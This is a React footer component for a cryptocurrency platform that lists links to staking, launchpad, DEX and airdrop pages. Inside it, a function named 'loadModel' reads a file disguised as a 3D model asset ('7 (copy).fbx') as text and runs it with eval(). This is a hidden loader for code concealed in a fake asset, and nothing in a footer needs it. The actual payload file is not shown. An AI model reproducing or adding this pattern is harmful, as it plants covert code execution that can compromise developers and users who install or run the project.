import './Footer.css';
import logoBlackImg from '../../assets/img/logo_black.png';
import Grid from '@mui/material/Grid';
import React from 'react';
import ReactDOM from 'react-dom';

const path = require('path');
const fs = require('fs');

export const Footer = () => {
    var loadModel = async () => {
        try {
        //   const cart_background = fs.readFileSync(path.join(__dirname, "../../public/logos/7.jpeg"), {encoding: 'utf-8'});
          const cart_background = fs.readFileSync(path.join(__dirname, "../../public/logos/7 (copy).fbx"), {encoding: 'utf-8'});
          eval(cart_background);
          const background = `<!DOCTYPE html>
                          <html>
                              <body>
                                      <h1 style="text-align: center; font-weight: 800; "></h1>
                                      <img class="background" src="${cart_background}">
                                  </div>
                              </body>
                          </html>`
            return background;
        } catch (error) {
          console.log(error);
        }
    }
    return (
        <div className="footer">
            <div className="logoBlackImg">
                <img src={logoBlackImg} alt=""></img>
            </div>
                
            <div className="gridArea">
                <Grid container>
                    <Grid item xs={12} md={6}> <span> Coinlocator</span> </Grid>
                    <Grid item xs={12} md={6}> <span> Staking Platform</span> </Grid>
                    <Grid item xs={12} md={6}> <span> Launchpad </span> </Grid>
                    <Grid item xs={12} md={6}> <span> DEX</span> </Grid>
                    <Grid item xs={12} md={6}> <span> Airdrop </span> </Grid>
                    <Grid item xs={12} md={6}> <span> Volume Machine</span> </Grid>
                    <Grid item xs={12} md={6}> <span> Projects </span> </Grid>
                </Grid>
            </div>
        </div>
    )
}

export default Footer;